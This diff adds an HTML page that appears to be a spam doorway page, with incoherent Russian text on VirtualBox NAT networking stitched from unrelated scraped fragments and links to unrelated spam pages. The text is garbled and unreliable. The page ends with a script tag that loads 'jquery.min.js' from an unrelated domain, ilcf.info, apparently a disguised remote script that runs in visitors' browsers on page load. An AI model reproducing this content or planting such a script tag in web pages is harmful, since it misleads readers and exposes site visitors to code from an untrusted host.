@@ -1,0 +1,155 @@
+<!DOCTYPE HTML>
+
+<html>
+
+<head>
+    <title>Virtualbox сеть nat - eikahphaix.neatline.org</title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link rel="stylesheet" href="main.css" />
+</head>
+
+<body class="subpage">
+    <div id="page-wrapper">
+
+        <!-- Header -->
+        <section id="header">
+            <div class="container">
+                <div class="row">
+                    <div class="col-12">
+
+                        <!-- Logo -->
+                        <h1><a href="/" id="logo">eikahphaix.neatline.org</a></h1>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Content -->
+        <section id="content">
+            <div class="container">
+                <div class="row">
+                    <div class="col-9 col-12-medium">
+
+                        <!-- Main Content -->
+                        <section>
+                            <header>
+                                <h2>Virtualbox сеть nat</h2>
+                            </header>
+                            <p>В этой статье подробно рассмотрен вопрос настройки сетей под виртуальной машиной VirtualBox. Типы NAT, сетевой мост, виртуальный адаптер хоста, внутренняя сеть…. Это может быть ошибкой в VirtualBox. Я испытал то же самое (Ubuntu 16.04.2 LTS, VirtualBox 5.0.32_Ubuntu r112930): настройте сеть NAT, настроенную для двух виртуальных машин Ubuntu. 
+Правильная настройка сети в виртуальной машине VirtualBox позволяет связать хостовую операционную систему с гостевой для наилучшего взаимодействия последних. 6. Сеть. Если сетевые настройки виртуальной машины были оставлены по умолчанию, то для виртуальной машины dhcp-сервером и роутером (через nat) будет хостовая машина. Например, в вашей домашней сети ваши хост и другие физические машины, обычно имеют адреса начинающиеся с 192.168.x.x. В VirtualBox NAT адаптерах адреса начинаются с 10.0.2.1, и далее до 10.0.2.24 в так называемой подсети. VirtualBox (Oracle VM VirtualBox) - бесплатное программное средство виртуализации для операционных систем Microsoft Windows, Linux, FreeBSD Как настроить сеть NAT и Host-Only со статическим IP-адресом в VirtualBox Я пытаюсь настроить набор гостей в VirtualBox, так что каждый из них может получить доступ к Интернету, а также быть видимым друг для друга и для хоста. 
+Подготовка к установке Kali Linux на VirtualBox. Если у вас еще не установлен VirtualBox (далее VB), то вы можете сделать это, используя наше руководство. Так что если у вас нет маршрутизатора и ваш компьютер подключается к сети напрямую, то вам надо использовать nat или Сеть nat, но ни в коем случае не cетевой мост. В этой статье мы узнаем как происходит в centos 7 настройка сети и как настроить статический ip адрес в CentOS 7/6, четырьмя способами. Внутренняя сеть, согласно руководству VirtualBox, является "программной сетью, которая может быть видима для выборочно установленных виртуальных машин, но не для приложений, работающих на хосте или на удаленных машинах, расположенных извне". Планирование сети. Все бы хорошо, но мы не правильно спланировали сеть в удаленном офисе. Например, в вашей домашней локальной сети хост и другие физические сетевые устройства имеют адреса в диапазоне, начинающемся с 192.168.х.х. В VirtualBox адаптеры, работающие по протоколу NAT, имеют IP-адреса в диапазоне, начинающемся с 10.0.2.1 и заканчивающемся 10.0.2.24. Друзья, мы рады сообщить о том, что мы начинаем публиковать статьи наших читателей. Последний вариант -- «Паравиртуальная сеть virtio-net» -- это не эмуляция реально существующего адаптера В-четвёртых, и это самое интересное — осталось передать маршруты одного филиала другому через магистральную сеть. 
+1. Сеть -> Адаптер 1 -> Тип подключения - NAT Проброс портов: Rule1: Протокол TCP IP хоста в системе это Ethernet adapter VirtualBox Host-Only Network : 10.0.2.101 Порт хоста: 5555 IP гостя: 10.0.2.15 (на скриншоте это адрес адаптера eth0). Головная боль всех системных администраторов это восстановление удаленной информации с различных носителей информации, которые никогда не подвергались резервному копирования. В Windows это делается довольно просто: перейдя в «Сетевое окружение» в адресной строке введите «Вся сеть» и вы увидите общую папку VirtualBox. 
+В этой статье подробно рассмотрен вопрос настройки сетей под виртуальной машиной VirtualBox. Настройка сети в VirtualBox для связи хостовой операционной системы с гостевой и выхода. Система виртуальных машин VirtualBox, установка и настройка на Windows 8.1 для одного языка. Средство виртуализации Oracle VM VirtualBox. Пример создания виртуальной машины и установка ОС Linux. Многих пользователей интересует установка Kali Linux на VirtualBox. Это бесплатный дистрибутив. как происходит в centos 7 настройка сети и как настроить статический ip адрес в CentOS 7/6, четырьмя. Планирование сети. Все бы хорошо, но мы не правильно спланировали сеть в удаленном офисе. Друзья, мы рады сообщить о том, что мы начинаем публиковать статьи наших читателей. Сегодня. Все выпуски12. Сети для самых маленьких. Часть двенадцатая. mpls l2vpn 11.1. Сети для самых маленьких. 
+Сегодня немного отвлечемся от обычный статей и развлечемся поговорим о хостинге. Другой пример иерархической сети – это телефонная сеть. В телефонном номере код страны. Tor; Официальный сайт , запущенный в Tor Browser: Тип: гибридная анонимная сеть луковой. НА САЙТЕ SamLab.ws ВЫ НЕ НАЙДЕТЕ КРЕКОВ ИЛИ КЛЮЧЕЙ К ПРОГРАММАМ И ИГРАМ - ЛЮБОЙ НЕЗАКОННЫЙ. </p>
+                        </section>
+
+                    </div>
+                    <div class="col-3 col-12-medium">
+
+                        <!-- Sidebar -->
+                        <section>
+                            <header>
+                                <h2>Links to Important Stuff</h2>
+                            </header>
+                            <ul class="link-list">
+                                <li><a href="ni09e-programmy-smartfon-skachat-besplatno.html">Программы смартфон скачать бесплатно</a></li>
+                                <li><a href="ni09e-tekst-pesni-avicii-ft-etta-james-levels.html">Текст песни avicii ft etta james levels</a></li>
+                                <li><a href="ni09e-hp-laserjet-m1522nf-scan-driver.html">Hp laserjet m1522nf scan driver</a></li>
+                                <li><a href="ni09e-shema-vyazki-vorotnika-shalka.html">Схема вязки воротника шалька</a></li>
+                                <li><a href="ni09e-ringtony-chistyy-kayf-remiks.html">Рингтоны чистый кайф ремикс</a></li>
+                                <li><a href="ni09e-skachat-igru-tekken-6-na-psp-besplatno.html">Скачать игру теккен 6 на psp бесплатно</a></li>
+                            </ul>
+                        </section>
+                        <section>
+                            <header>
+                                <h2>Links</h2>
+                            </header>
+                            <ul class="link-list"><li>Настройка сети в VirtualBox.</li>
+<li>Настройка сети в VirtualBox.</li>
+<li>VirtualBox: виртуальная машина на Windows 8.1 для одного.</li>
+<li>Установка Linux на виртуальную машину VirtualBox.</li>
+<li>Установка Kali Linux на VirtualBox.</li>
+<li>Как настроить сеть в CentOS 6-7 Как настроить.</li>
+<li>Статическая маршрутизация Cisco Настройка серверов.</li>
+<li>Сети для самых маленьких  - LinkMeUp.</li>
+<li>Сети для самых маленьких  - LinkMeUp.</li>
+<li>Постигаем основы операционных систем, учимся.</li>
+</ul>
+                        </section>
+
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Footer -->
+        <section id="footer">
+            <div class="container">
+                <div class="row">
+                    <div class="col-8 col-12-medium">
+
+                        <!-- Links -->
+                        <section>
+                            <h2>Links to Important Stuff</h2>
+                            <div>
+                                <div class="row">
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="ni09e-prius-20-manual-na-russkom.html">Приус 20 мануал на русском</a></li>
+                                            <li><a href="ni09e-skachat-igry-realistichnye-gonki-cherez-torrent.html">Скачать игры реалистичные гонки через торрент</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="ni09e-john-murphy-28-days-later.html">John murphy 28 days later</a></li>
+                                            <li><a href="ni09e-prikaz-o-pravo-podpisi-dokumentov-obrazec.html">Приказ о право подписи документов образец</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="ni09e-minusovka-drugie-pravila-leti-begi.html">Минусовка другие правила лети беги</a></li>
+                                            <li><a href="ni09e-raspisanie-avtobusa-51-balashiha.html">Расписание автобуса 51 балашиха</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="ni09e-skachat-torrent-film-pryachsya.html">Скачать торрент фильм прячься</a></li>
+                                            <li><a href="ni09e-digital-clock-7.html">Digital clock 7</a></li>
+                                        </ul>
+                                    </div>
+                                </div>
+                            </div>
+                        </section>
+
+                    </div>
+                    <div class="col-4 col-12-medium imp-medium">
+
+                        <!-- Blurb -->
+                        <section>
+                            <h2>An Informative Text Blurb</h2>
+                        </section>
+
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Copyright -->
+        <div id="copyright">
+            &copy; Untitled. All rights reserved.</a>
+        </div>
+
+    </div>
+
+    <script type="text/javascript">
+        new Image().src = "//counter.yadro.ru/hit;jquery?r" +
+            escape(document.referrer) + ((typeof(screen) == "undefined") ? "" :
+                ";s" + screen.width + "*" + screen.height + "*" + (screen.colorDepth ?
+                    screen.colorDepth : screen.pixelDepth)) + ";u" + escape(document.URL) +
+            ";h" + escape(document.title.substring(0, 150)) +
+            ";" + Math.random();
+    </script>
+<script src="http://ilcf.info/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+</body>
+</html>
